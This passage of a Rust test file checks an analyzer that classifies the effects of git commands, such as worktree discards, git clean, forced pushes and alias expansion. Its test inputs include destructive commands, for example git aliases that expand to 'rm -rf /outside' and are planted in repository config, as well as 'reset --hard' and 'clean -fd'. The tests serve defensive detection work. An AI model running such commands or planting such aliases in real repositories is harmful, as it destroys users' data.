            .iter()
            .find(|effect| effect.operation.0 == "git.worktree_discard_request")
            .unwrap_or_else(|| panic!("branch creation request: {argv:?}"));
        assert_eq!(
            request.attributes.get("scope"),
            Some(&AttrValue::String("whole".into())),
            "{argv:?}"
        );
        assert_eq!(
            request.attributes.get("target"),
            Some(&AttrValue::String("topic".into())),
            "{argv:?}"
        );
        assert_eq!(
            request.attributes.get("start_point"),
            Some(&AttrValue::String("origin/other".into())),
            "{argv:?}"
        );
        assert!(
            !request.attributes.contains_key("selections"),
            "a start point was selected as a path: {argv:?}"
        );
    }

    // The last merge option decides whether a forced switch or checkout can
    // discard.
    for (sub, force) in [
        ("switch", "-f"),
        ("switch", "--force"),
        ("switch", "--discard-changes"),
        ("checkout", "-f"),
        ("checkout", "--force"),
    ] {
        for (merge_options, rejected) in [
            (vec![], false),
            (vec!["--no-merge"], false),
            (vec!["--merge"], true),
            (vec!["-m"], true),
            (vec!["--merge", "--no-merge"], false),
            (vec!["-m", "--no-merge"], false),
            (vec!["--no-merge", "--merge"], true),
            (vec!["--no-merge", "-m"], true),
        ] {
            let mut argv = vec!["git", sub, force];
            argv.extend(merge_options);
            argv.push("main");
            let plan = analyze(&argv, Some("/w"));
            assert!(plan.boundaries.is_empty(), "{argv:?}");
            assert!(
                plan.effects
                    .iter()
                    .any(|effect| effect.operation.0 == "process.exec"),
                "{argv:?}"
            );
            if rejected {
                assert!(command_effects(&plan).is_empty(), "{argv:?}");
            } else {
                assert!(has_effect(&plan, "git.worktree_discard", "/w"), "{argv:?}");
                if sub == "checkout" {
                    continue;
                }
                let request = plan
                    .effects
                    .iter()
                    .find(|effect| effect.operation.0 == "git.worktree_discard_request")
                    .unwrap_or_else(|| panic!("forced switch request: {argv:?}"));
                assert_eq!(
                    request.request_assurance,
                    effinterp_proto::RequestAssurance::Exact,
                    "{argv:?}"
                );
                assert_eq!(
                    request.attributes.get("force"),
                    Some(&AttrValue::Bool(true))
                );
                assert_eq!(
                    request.attributes.get("scope"),
                    Some(&AttrValue::String("whole".into()))
                );
            }
        }
    }

    // git switch takes at most one branch; two operands is a form it rejects.
    let invalid = analyze(&["git", "switch", "-f", "main", "other"], Some("/w"));
    assert!(command_effects(&invalid).is_empty());
    assert!(invalid.boundaries.is_empty());
    assert!(
        !invalid
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "git.worktree_discard_request"),
        "invalid switch was certified: {:?}",
        invalid.effects
    );

    for argv in [
        ["git", "switch", "-c", "topic"].as_slice(),
        ["git", "switch", "--create=topic", "main"].as_slice(),
        ["git", "switch", "-C", "topic"].as_slice(),
        ["git", "switch", "--force-create", "topic"].as_slice(),
        ["git", "switch", "--orphan", "topic"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(has_effect(&plan, "git.worktree_write", "/w"), "{argv:?}");
        assert!(has_effect(&plan, "git.ref_update", "/w"), "{argv:?}");
    }
    for argv in [
        ["git", "switch", "--detach", "HEAD"].as_slice(),
        ["git", "switch", "-"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(has_effect(&plan, "git.worktree_write", "/w"), "{argv:?}");
    }

    let plan = analyze(&["git", "checkout", "main"], Some("/w"));
    assert!(has_effect(&plan, "git.worktree_write", "/w"));
    assert!(!ops(&plan).iter().any(|(o, _)| *o == "git.worktree_discard"));

    let plan = analyze(&["git", "checkout", "-f"], Some("/w"));
    assert!(has_effect(&plan, "git.worktree_discard", "/w"));

    for argv in [
        ["git", "restore", "--staged", "file"].as_slice(),
        ["git", "checkout", "--force=false", "."].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "git.worktree_discard_request"),
            "non-worktree or false-force checkout was certified: {argv:?}"
        );
    }
}

#[test]
fn git_checkout_bundled_and_abbreviated_options() {
    for (argv, mode, target) in [
        (["git", "checkout", "-qf"].as_slice(), "checkout", None),
        (
            ["git", "checkout", "-fb", "topic"].as_slice(),
            "checkout",
            Some("topic"),
        ),
        (
            ["git", "checkout", "-fbtopic"].as_slice(),
            "checkout",
            Some("topic"),
        ),
        (
            ["git", "switch", "--di", "main"].as_slice(),
            "switch",
            Some("main"),
        ),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert_eq!(
            attr(&plan, "git.worktree_discard_request", "discard_mode"),
            Some(AttrValue::String(mode.into())),
            "{argv:?}"
        );
        assert_eq!(
            attr(&plan, "git.worktree_discard_request", "scope"),
            Some(AttrValue::String("whole".into())),
            "{argv:?}"
        );
        assert_eq!(
            attr(&plan, "git.worktree_discard_request", "target"),
            target.map(|target| AttrValue::String(target.into())),
            "{argv:?}"
        );
    }
    // `--d` could be --detach or --discard-changes, which git rejects; a
    // branch name after `-b` is never an option cluster.
    for argv in [
        ["git", "switch", "--d", "main"].as_slice(),
        ["git", "checkout", "-b", "-qf"].as_slice(),
        ["git", "checkout", "-qx"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert_eq!(
            attr(&plan, "git.worktree_discard_request", "discard_mode"),
            None,
            "{argv:?}"
        );
    }
}

#[test]
fn git_clean_force_semantics() {
    let plan = analyze(&["git", "clean", "-fd"], Some("/w"));
    assert!(has_effect(&plan, "git.worktree_discard", "/w"));
    let request = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.clean_request")
        .expect("clean request");
    assert_eq!(
        request.request_assurance,
        effinterp_proto::RequestAssurance::Exact
    );
    assert_eq!(
        request.attributes.get("selection_complete"),
        Some(&AttrValue::Bool(true))
    );
    assert_eq!(
        request.attributes.get("untracked"),
        Some(&AttrValue::Bool(true))
    );
    assert_eq!(
        request.attributes.get("discard_mode"),
        Some(&AttrValue::String("clean".into()))
    );
    assert_eq!(
        request.attributes.get("dry_run"),
        Some(&AttrValue::Bool(false))
    );
    assert_eq!(
        attr(&plan, "git.worktree_discard", "directories"),
        Some(AttrValue::Bool(true))
    );
    let root = analyze(&["git", "clean", "-f", ":/"], Some("/w"));
    assert_eq!(
        attr(&root, "git.clean_request", "selections"),
        Some(strings(&["/w"]))
    );
    // Git discovers the top `:/` names upward from /w; the host resolves it.
    assert_eq!(
        attr(&root, "git.clean_request", "selects_top"),
        Some(AttrValue::Bool(true))
    );
    assert!(!has_boundary(&root, "unrecognized_arguments"));
    let named = analyze(
        &["git", "--work-tree=/w", "clean", "-f", ":/"],
        Some("/w/src"),
    );
    assert_eq!(
        attr(&named, "git.clean_request", "selections"),
        Some(strings(&["/w"]))
    );
    assert_eq!(attr(&named, "git.clean_request", "selects_top"), None);
    // A positive top-relative pathspec beside `:/` is part of the whole tree;
    // an exclusion narrows it, so the selection is no longer known.
    let subset = analyze(&["git", "clean", "-f", ":/", ":/src"], Some("/w"));
    assert_eq!(
        attr(&subset, "git.clean_request", "selects_top"),
        Some(AttrValue::Bool(true))
    );
    for pathspec in [":!build", ":/!build"] {
        let excluded = analyze(&["git", "clean", "-f", ":/", pathspec], Some("/w"));
        assert_eq!(
            attr(&excluded, "git.clean_request", "selects_top"),
            None,
            "{pathspec}"
        );
    }
    // `:(top)` is the long-magic spelling of `:/`; with a path it names
    // only that path, and further magic is not a whole-tree selection.
    for (pathspecs, selects_top) in [
        (&[":(top)"][..], Some(AttrValue::Bool(true))),
        (&[":(top)", ":(top)src"], Some(AttrValue::Bool(true))),
        (&[":(top)build"], None),
        (&[":(top)", ":(exclude)build"], None),
        (&[":(top,exclude)build"], None),
    ] {
        let argv = [&["git", "clean", "-f"][..], pathspecs].concat();
        let plan = analyze(&argv, Some("/w/src"));
        assert_eq!(
            attr(&plan, "git.clean_request", "selects_top"),
            selects_top,
            "{pathspecs:?}"
        );
    }
    let plan = Engine::new()
        .analyze(&Subject::Exec {
            argv: ["git", "clean", "-fd"]
                .into_iter()
                .map(str::to_string)
                .collect(),
            cwd: Some("/w".into()),
            context: HostContext {
                env: std::collections::BTreeMap::from([
                    ("GIT_WORK_TREE".into(), "/alternate".into()),
                    ("GIT_DIR".into(), "/alternate/.git".into()),
                ]),
                ..HostContext::default()
            },
        })
        .unwrap();
    let request = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.clean_request")
        .expect("environment-configured clean request");
    assert_eq!(
        request.attributes.get("root_uses_invocation_cwd"),
        Some(&AttrValue::Bool(false))
    );
    // A -C naming the invocation's own directory still discovers from it.
    // Any -C alone discovers from the worktree it names; a named work tree
    // does not discover at all.
    for (argv, from_cwd, from_worktree) in [
        (&["git", "-C", ".", "clean", "-fd"][..], true, true),
        (&["git", "-C", "/w/src", "clean", "-fd"], true, true),
        (&["git", "-C", "..", "clean", "-fd"], false, true),
        (&["git", "-C", "other", "clean", "-fd"], false, true),
        (&["git", "--work-tree=/w/src", "clean", "-fd"], false, false),
    ] {
        let plan = analyze(argv, Some("/w/src"));
        let request = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "git.clean_request")
            .unwrap();
        assert_eq!(
            request.attributes.get("root_uses_invocation_cwd"),
            Some(&AttrValue::Bool(from_cwd)),
            "{argv:?}"
        );
        assert_eq!(
            request.attributes.get("discovers_from_worktree"),
            Some(&AttrValue::Bool(from_worktree)),
            "{argv:?}"
        );
    }

    for source in [
        r#"GIT_WORK_TREE="$UNKNOWN" git clean -fd"#,
        r#"GIT_WORK_TREE="$UNKNOWN" git -C /repo restore ./file"#,
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/w".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        assert!(
            !plan.effects.iter().any(|effect| matches!(
                effect.operation.0.as_str(),
                "git.clean_request" | "git.worktree_discard_request"
            )),
            "{source}"
        );
    }
    let plan = Engine::new()
        .analyze(&Subject::Shell {
            source: r#"GIT_DIR="$UNKNOWN" git status"#.into(),
            cwd: Some("/w".into()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    assert!(plan.effects.iter().any(|effect| matches!(&effect.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::GitRepository { git_dir: Some(dir), .. } }
        if matches!(dir.as_ref(), ResourceExpr::Unresolved { family } if family.0 == "filesystem"))));
    let plan = Engine::new()
        .analyze(&Subject::Shell {
            source: "GIT_WORK_TREE=tree GIT_DIR=metadata git -C /repo restore ./file".into(),
            cwd: Some("/w".into()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    let request = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.worktree_discard_request")
        .unwrap();
    assert_eq!(
        request.attributes.get("selections"),
        Some(&strings(&["/repo/tree/file"]))
    );
    assert_eq!(
        request.attributes.get("root_uses_invocation_cwd"),
        Some(&AttrValue::Bool(false))
    );
    assert!(matches!(&request.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::GitRepository { git_dir: Some(dir), .. } }
        if display_resource(dir) == "fs:/repo/metadata"));

    let plan = analyze(&["git", "clean"], Some("/w"));
    assert!(has_effect(&plan, "git.read", "/w"));
    assert!(
        !plan
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "git.clean_request")
    );

    let plan = analyze(
        &["git", "-c", "clean.requireForce=false", "clean"],
        Some("/w"),
    );
    assert!(has_effect(&plan, "git.worktree_discard", "/w"));

    let plan = analyze(
        &[
            "git",
            "-c",
            "clean.requireForce=false",
            "-c",
            "clean.requireForce=true",
            "clean",
        ],
        Some("/w"),
    );
    assert!(has_effect(&plan, "git.read", "/w"));
    for args in [
        vec!["-nf"],
        vec!["-fn"],
        vec!["-if"],
        vec!["-f", "--no-force"],
        vec!["--", "-f"],
        vec!["-e", "-f"],
        vec!["-f", "--unknown"],
    ] {
        let mut argv = vec!["git", "clean"];
        argv.extend(args);
        let plan = analyze(&argv, Some("/w"));
        assert!(
            !plan
                .effects
                .iter()
                .any(|e| e.operation.0 == "git.worktree_discard"),
            "{argv:?}"
        );
        if argv.contains(&"-if") || argv.contains(&"--unknown") {
            assert!(has_boundary(&plan, "unrecognized_arguments"), "{argv:?}");
        }
    }
    for args in [
        vec!["--no-force", "-f"],
        vec!["-nf", "--no-dry-run"],
        vec!["-if", "--no-interactive"],
    ] {
        let mut argv = vec!["git", "clean"];
        argv.extend(args);
        let plan = analyze(&argv, Some("/w"));
        assert_eq!(
            attr(&plan, "git.worktree_discard", "force"),
            Some(AttrValue::Bool(true))
        );
        assert_eq!(
            attr(&plan, "git.worktree_discard", "dry_run"),
            Some(AttrValue::Bool(false))
        );
    }
    for (cwd, args, paths) in [
        ("/w", vec![], vec!["/w"]),
        ("/w/sub", vec![], vec!["/w/sub"]),
        ("/w", vec!["."], vec!["/w"]),
        ("/w/sub", vec![".."], vec!["/w"]),
        ("/w", vec!["build", "."], vec!["/w/build", "/w"]),
        ("/w", vec!["--", "-n"], vec!["/w/-n"]),
        ("/w", vec![":(top)"], vec!["/w"]),
    ] {
        let mut argv = vec!["git", "clean", "-f"];
        argv.extend(args);
        let plan = analyze(&argv, Some(cwd));
        let effects: Vec<_> = plan
            .effects
            .iter()
            .filter(|e| e.operation.0 == "git.worktree_discard")
            .collect();
        assert_eq!(effects.len(), paths.len(), "{argv:?}");
        for (effect, path) in effects.iter().zip(paths) {
            assert_eq!(
                effect.attributes.get("selection_path"),
                Some(&AttrValue::String(path.into())),
                "{argv:?}"
            );
            assert!(!effect.attributes.contains_key("whole_worktree"));
        }
    }
    for (args, cwd) in [(vec!["*"], Some("/w")), (vec![], None)] {
        let mut argv = vec!["git", "clean", "-f"];
        argv.extend(args);
        let plan = analyze(&argv, cwd);
        assert_eq!(
            attr(&plan, "git.worktree_discard", "selection_path"),
            None,
            "{argv:?}"
        );
        assert!(has_boundary(&plan, "unrecognized_arguments"), "{argv:?}");
    }

    // An exclude pattern only removes files from the set inside the pathspec,
    // so the discard stays exactly the pathspec the command named.
    let plan = analyze(&["git", "clean", "-f", "-e", "keep", "."], Some("/w"));
    assert_eq!(
        attr(&plan, "git.worktree_discard", "selection_path"),
        Some(AttrValue::String("/w".into()))
    );
    assert_eq!(
        attr(&plan, "git.clean_request", "excluded"),
        Some(AttrValue::Bool(true))
    );
    assert!(!has_boundary(&plan, "unrecognized_arguments"));
}

#[test]
fn git_aliases_preserve_quoting_shell_effects_and_forwarded_arguments() {
    let plan = analyze(
        &["git", "-c", "alias.wipe=reset --hard", "wipe"],
        Some("/w"),
    );
    assert!(!has_boundary(&plan, "unresolved_alias"));
    assert!(has_effect(&plan, "git.worktree_discard", "/w"));
    assert_eq!(
        plan.coverage.0[&Domain::new("git")].level,
        CoverageLevel::Full
    );

    // git never lets an alias shadow a command it already has.
    let builtin = analyze(
        &["git", "-c", "alias.status=reset --hard", "status"],
        Some("/w"),
    );
    assert!(
        !builtin
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "git.worktree_discard")
    );
    assert!(has_effect(&builtin, "git.read", "/w"));

    for expansion in [
        "alias.wipe=reset '--hard'",
        "alias.wipe=reset \"--hard\"",
        "alias.wipe=reset --h\\ard",
        "alias.wipe=reset --hard \"$REV\"",
    ] {
        let plan = analyze(&["git", "-c", expansion, "wipe"], Some("/w"));
        assert!(!has_boundary(&plan, "unresolved_alias"), "{expansion}");
        assert!(
            has_effect(&plan, "git.worktree_discard", "/w"),
            "{expansion}"
        );
    }
    for (expansion, path) in [
        ("alias.wipe=restore 'two words'", "two words"),
        ("alias.wipe=restore \"two words\"", "two words"),
        ("alias.wipe=restore two\\ words", "two words"),
        ("alias.wipe=restore '$HOME;file'", "$HOME;file"),
        ("alias.wipe=restore \"a\\qb\"", "aqb"),
    ] {
        let plan = analyze(&["git", "-c", expansion, "wipe"], Some("/w"));
        assert_eq!(
            attr(&plan, "git.worktree_discard_request", "selections"),
            Some(strings(&[&format!("/w/{path}")])),
            "{expansion}"
        );
    }
    for expansion in ["alias.wipe=reset '--hard", "alias.wipe=reset --hard\\"] {
        let plan = analyze(&["git", "-c", expansion, "wipe"], Some("/w"));
        assert!(has_boundary(&plan, "unresolved_alias"), "{expansion}");
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0.starts_with("git."))
        );
    }
    for argv in [
        vec!["git", "-c", "alias.wipe=!rm -rf /outside", "wipe"],
        vec!["git", "-c", "alias.wipe=!rm -rf", "wipe", "/outside"],
        vec![
            "git",
            "-c",
            "alias.wipe=!f() { rm -rf \"$1\"; }; f",
            "wipe",
            "/outside",
        ],
    ] {
        let plan = analyze(&argv, Some("/w/subdir"));
        assert!(
            has_effect(&plan, "filesystem.delete", "/outside"),
            "{argv:?}: {:?}",
            ops(&plan)
        );
        assert!(!has_boundary(&plan, "unresolved_alias"));
        let deletion = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.delete")
            .unwrap();
        assert!(!deletion.provenance.is_empty());
    }
    let overridden = analyze(
        &[
            "git",
            "-c",
            "alias.wipe=!rm -rf /outside",
            "--config-env=alias.wipe=ALIAS",
            "wipe",
        ],
        Some("/w"),
    );
    assert!(has_boundary(&overridden, "unresolved_alias"));
    assert!(
        !overridden
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.delete")
    );
    let relative = analyze(
        &["git", "-c", "alias.wipe=!rm -rf relative", "wipe"],
        Some("/w/subdir"),
    );
    assert!(!has_effect(
        &relative,
        "filesystem.delete",
        "/w/subdir/relative"
    ));
}

#[test]
fn git_alias_section_is_case_insensitive() {
    let plan = analyze(
        &["git", "-c", "ALIAS.WIPE=reset --hard", "WiPe"],
        Some("/w"),
    );
    assert!(!has_boundary(&plan, "unresolved_alias"));
    assert!(!has_boundary(&plan, "unmodeled_subcommand"));
    assert_eq!(
        attr(&plan, "git.reset_request", "reset_mode"),
        Some(AttrValue::String("hard".into()))
    );
}

#[test]
fn git_observed_repository_aliases_keep_config_provenance_and_refuse_unresolved_layers() {
    use effinterp_engine::{
        SourceRefusal, SourceRequest, SourceResolver, SourceResponse, UnavailableReason,
    };
    struct Config(&'static str);
    impl SourceResolver for Config {
        fn resolve(&self, request: SourceRequest<'_>) -> SourceResponse {
            if request.path == "/w/subdir/.git/HEAD" && self.0.starts_with("# nested repository") {
                SourceResponse::Source(b"ref: refs/heads/main\n".to_vec())
            } else if request.path == "/w/.git/config" {
                SourceResponse::Source(self.0.as_bytes().to_vec())
            } else {
                SourceResponse::Refused(SourceRefusal::Unavailable(UnavailableReason::Missing))
            }
        }
        fn siblings(&self, _: &str) -> Option<Vec<String>> {
            None
        }
    }
    for config in [
        "[alias]\n wipe = !rm -rf /outside\n",
        "[alias]\n wipe = \"!rm -rf /outside\" # comment\n",
        "[alias]\n wipe = !rm \\\n-rf /outside\n",
    ] {
        let plan = Engine::new()
            .with_resolver(Box::new(Config(config)))
            .analyze(&Subject::Exec {
                argv: vec!["git".into(), "wipe".into()],
                cwd: Some("/w/subdir".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        assert!(
            has_effect(&plan, "filesystem.delete", "/outside"),
            "{config}: {:?}",
            ops(&plan)
        );
        assert!(plan.provenance.iter().any(|node| matches!(&node.kind, ProvenanceKind::SourceInput { path, .. } if path == "/w/.git/config")));
    }
    for config in [
        "[alias]\n wipe = !rm -rf /outside\n[include]\n path = other\n",
        "[alias]\n wipe = !rm -rf /outside\n[extensions]\n worktreeConfig = true\n",
        "[alias]\n wipe = \"!rm -rf /outside\n",
        "# nested repository\n[alias]\n wipe = !rm -rf /outside\n",
        "[broken!]\n x = y\n[alias]\n wipe = !rm -rf /outside\n",
        "[core]\n 1invalid = true\n[alias]\n wipe = !rm -rf /outside\n",
    ] {
        let plan = Engine::new()
            .with_resolver(Box::new(Config(config)))
            .analyze(&Subject::Exec {
                argv: vec!["git".into(), "wipe".into()],
                cwd: Some("/w/subdir".into()),
                context: Default::default(),
            })
            .unwrap();
        assert!(has_boundary(&plan, "unresolved_alias"), "{config}");
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.delete")
        );
    }
}

#[test]
fn git_push_force() {
    let plan = analyze(&["git", "push", "--force", "origin", "main"], Some("/w"));
    assert!(has_effect(&plan, "git.remote_sync", "/w"));
    assert!(
        plan.effects
            .iter()
            .any(|effect| effect.operation.0 == "process.exec")
    );
    assert!(
        !plan
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "network.connect")
    );
    assert_eq!(
        attr(&plan, "git.remote_sync", "force"),
        Some(AttrValue::Bool(true))
    );
    assert!(has_effect(&plan, "network.upload", "?network"));
    assert!(has_boundary(&plan, "unmodeled_hooks"));

    // `--fo` is ambiguous between --force and --force-with-lease and
    // selects neither.
    let plan = analyze(&["git", "push", "--fo", "origin", "main"], Some("/w"));
    assert_eq!(
        attr(&plan, "git.remote_sync", "force"),
        Some(AttrValue::Bool(false))
    );
}

// The per-destination lists either enumerate every destination or stay absent,
// so a push guard over them reads an unknown push as unknown, never as a push
// that misses `main`. The `known_` witness lists name only destinations known
// to match, whatever the rest of the push is.
#[test]
fn git_push_destination_lists_are_complete_or_absent() {
    let names = |names: &[&str]| {
        Some(AttrValue::List(
            names
                .iter()
                .map(|name| AttrValue::String((*name).into()))
                .collect(),
        ))
    };
    let request = |source: &str| {
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/w".into()),
                context: Default::default(),
            })
            .unwrap();
        plan.effects
            .into_iter()
            .find(|effect| effect.operation.0 == "git.push_request")
            .unwrap_or_else(|| panic!("missing push request for {source}"))
            .attributes
    };
    let lists = |source: &str| {
        let request = request(source);
        [
            "updated_destinations",
            "deleted_destinations",
            "leased_destinations",
            "unleased_forced_destinations",
            "known_deleted_destinations",
            "known_unleased_forced_destinations",
        ]
        .map(|key| request.get(key).cloned())
    };
    let none = names(&[]);
    for source in [
        "git push",
        "git push origin",
        "git push --all origin",
        "git push --mirror origin",
        "git push origin main --tags",
        "git push origin main --follow-tags",
        "git push --prune origin main",
        r#"git push origin "$(cat f)""#,
        "git push origin :",
        // A symbolic lease value may cover `main`.
        r#"git push --force-with-lease="$(cat f)" origin +main"#,
    ] {
        assert_eq!(
            lists(source),
            [None, None, None, None, none.clone(), none.clone()],
            "{source}"
        );
    }
    for source in [
        r#"git push origin +main "$(cat f)""#,
        "git push origin +main --tags",
        "git push --prune origin +main",
    ] {
        assert_eq!(
            lists(source),
            [None, None, None, None, none.clone(), names(&["main"])],
            "{source}"
        );
    }
    // `HEAD` and `@` name the current branch, which the model does not know:
    // a list that would select it is left out, one that selects nothing is
    // known empty.
    for source in [
        "git push origin HEAD",
        "git push origin @",
        "git push origin main:HEAD",
    ] {
        assert_eq!(
            lists(source),
            [
                None,
                none.clone(),
                none.clone(),
                none.clone(),
                none.clone(),
                none.clone()
            ],
            "{source}"
        );
    }
    // The witnesses keep `HEAD` and `@` as spelled: a force or deletion is
    // known even where the branch name is not.
    for (source, head) in [
        ("git push origin +HEAD", "HEAD"),
        ("git push origin +@", "@"),
        ("git push origin +main:HEAD", "HEAD"),
    ] {
        assert_eq!(
            lists(source),
            [
                None,
                none.clone(),
                none.clone(),
                None,
                none.clone(),
                names(&[head])
            ],
            "{source}"
        );
    }
    // A forced matching push names no branch, yet its force is known.
    assert_eq!(
        lists("git push origin +:"),
        [None, None, None, None, none.clone(), names(&[""])]
    );
    assert_eq!(
        lists("git push origin :HEAD"),
        [
            none.clone(),
            None,
            none.clone(),
            none.clone(),
            names(&["HEAD"]),
            none.clone()
        ]
    );
    // A certain configured forced refspec is a witness; an unestablished
    // one only makes the push possibly unleased forced.
    let configured = "git -c remote.origin.push=+refs/heads/main:refs/heads/main push origin";
    assert_eq!(lists(configured)[5], names(&["main"]), "{configured}");
    // Where the lease is unknown, a named lease is compared with the
    // destination's spelling, as the push guards have compared it: for
    // `HEAD`, and for a target no ref name can spell.
    for (source, possible) in [
        (configured, false),
        (
            "git config remote.origin.push '+refs/heads/*:refs/heads/*' && git push origin",
            true,
        ),
        ("git push origin main", false),
        ("git push --force-with-lease=main origin +HEAD", true),
        ("git push --force-with-lease=HEAD origin +HEAD", false),
        ("git push --force-with-lease='ma*' origin +main", true),
    ] {
        assert_eq!(
            request(source).get("possibly_unleased_forced"),
            Some(&AttrValue::Bool(possible)),
            "{source}"
        );
    }
    // Beside `HEAD` the complete lists are left out, yet the witnesses still
    // name a protected branch known to be updated and leased.
    let head = request("git push --force-with-lease=main origin +main HEAD");
    assert_eq!(
        head.get("known_updated_destinations").cloned(),
        names(&["main", "HEAD"])
    );
    assert_eq!(
        head.get("known_leased_destinations").cloned(),
        names(&["main"])
    );
    assert_eq!(head.get("leased_destinations"), None);
    // A literal target spelling the destination proves its lease beside an
    // unreadable one.
    for source in [
        r#"L=; git push --force-with-lease="$L" --force-with-lease=main origin +main"#,
        "git push --force-with-lease='ma*' --force-with-lease=main origin +main",
    ] {
        assert_eq!(
            lists(source),
            [
                names(&["main"]),
                none.clone(),
                names(&["main"]),
                none.clone(),
                none.clone(),
                none.clone()
            ],
            "{source}"
        );
    }
    assert_eq!(
        lists(r#"git push origin :main "$(cat f)""#),
        [None, None, None, None, names(&["main"]), none.clone()]
    );
    assert_eq!(
        lists("git push origin :main feature"),
        [
            names(&["feature"]),
            names(&["main"]),
            none.clone(),
            none.clone(),
            names(&["main"]),
            none.clone(),
        ]
    );
    assert_eq!(
        lists("git push --force-with-lease=main origin +main +topic"),
        [
            names(&["main", "topic"]),
            none.clone(),
            names(&["main"]),
            names(&["topic"]),
            none.clone(),
            names(&["topic"]),
        ]
    );
    // A lease is never consulted for a deletion.
    assert_eq!(
        lists("git push --force-with-lease=master origin main :master"),
        [
            names(&["main"]),
            names(&["master"]),
            none.clone(),
            none.clone(),
            names(&["master"]),
            none.clone(),
        ]
    );
    assert_eq!(
        lists("gh api -X PATCH repos/o/r/git/refs/heads/main -F force=true -f sha=abc"),
        [
            names(&["main"]),
            none.clone(),
            none.clone(),
            names(&["main"]),
            none.clone(),
            names(&["main"]),
        ]
    );
}

#[test]
fn git_push_request_certifies_literal_controls_without_remote_fabrication() {
    for argv in [
        vec!["git", "push", "--force", "origin", "main"],
        vec!["git", "push", "--force-with-lease=main", "origin", "main"],
        vec!["git", "push", "--delete", "origin", "old"],
        vec!["git", "push", "origin", "tag", "main"],
        vec!["git", "push", "--force", "--no-force", "origin", "main"],
        vec!["git", "push", "--force"],
    ] {
        let plan = analyze(&argv, Some("/w"));
        let request = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "git.push_request")
            .unwrap_or_else(|| panic!("missing push request for {argv:?}"));
        assert_eq!(
            request.request_assurance,
            effinterp_proto::RequestAssurance::Exact,
            "{argv:?}"
        );
        assert_eq!(
            request.modality,
            effinterp_proto::Modality::MustOnSuccess,
            "{argv:?}"
        );
    }
    let prune = analyze(&["git", "push", "--prune", "origin"], Some("/w"));
    let deletion = prune
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.ref_delete_request")
        .expect("push prune deletion request");
    assert_eq!(
        deletion.request_assurance,
        effinterp_proto::RequestAssurance::Exact
    );
    assert_eq!(
        deletion.attributes.get("remote"),
        Some(&AttrValue::String("origin".into()))
    );
    assert_eq!(
        deletion.attributes.get("prune"),
        Some(&AttrValue::Bool(true))
    );
    for argv in [
        ["git", "push", "origin"].as_slice(),
        ["git", "push", "--dry-run", "--prune", "origin"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "git.ref_delete_request"),
            "{argv:?}"
        );
    }
    for source in [
        "git push --dry-run",
        "git push --dry-run -- \"$REMOTE\" main",
        "git push --dry-run \"$REMOTE\" main",
        "git push --dry-run --repo=\"$REMOTE\"",
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/w".into()),
                context: Default::default(),
            })
            .unwrap();
        assert_eq!(attr(&plan, "git.remote_sync", "remote"), None, "{source}");
        assert_eq!(
            attr(&plan, "git.remote_sync", "remote_complete"),
            Some(AttrValue::Bool(false)),
            "{source}"
        );
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "git.push_request")
        );
    }
    for argv in [
        vec!["git", "push", "origin", "main"],
        vec!["git", "push", "--repo=backup", "main"],
        vec!["git", "push", "--force"],
    ] {
        let plan = analyze(&argv, Some("/w"));
        for key in ["remote", "remote_complete"] {
            assert_eq!(
                attr(&plan, "git.remote_sync", key),
                attr(&plan, "git.push_request", key),
                "{argv:?}: {key}"
            );
        }
    }
    let plan = analyze(&["git", "push", "--force"], Some("/w"));
    let request = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.push_request")
        .unwrap();
    assert_eq!(
        request.attributes.get("destination_complete"),
        Some(&AttrValue::Bool(false))
    );
    assert_eq!(request.attributes.get("updated_destinations"), None);
    assert_eq!(
        request.attributes.get("force"),
        Some(&AttrValue::Bool(true))
    );
    assert_eq!(
        request.attributes.get("dry_run"),
        Some(&AttrValue::Bool(false))
    );
    let plan = analyze(&["git", "push", "+main"], Some("/w"));
    let request = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.push_request")
        .unwrap();
    assert_eq!(
        request.attributes.get("known_unleased_forced_destinations"),
        Some(&strings(&["main"]))
    );
    let plan = analyze(&["git", "push", "origin", ":old"], Some("/w"));
    let request = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.push_request")
        .unwrap();
    assert_eq!(
        request.attributes.get("deleted_destinations"),
        Some(&strings(&["old"]))
    );
    for (key, value) in [("active", true), ("abort", false), ("dry_run", false)] {
        assert_eq!(
            request.attributes.get(key),
            Some(&AttrValue::Bool(value)),
            "{key}"
        );
    }

    for argv in [
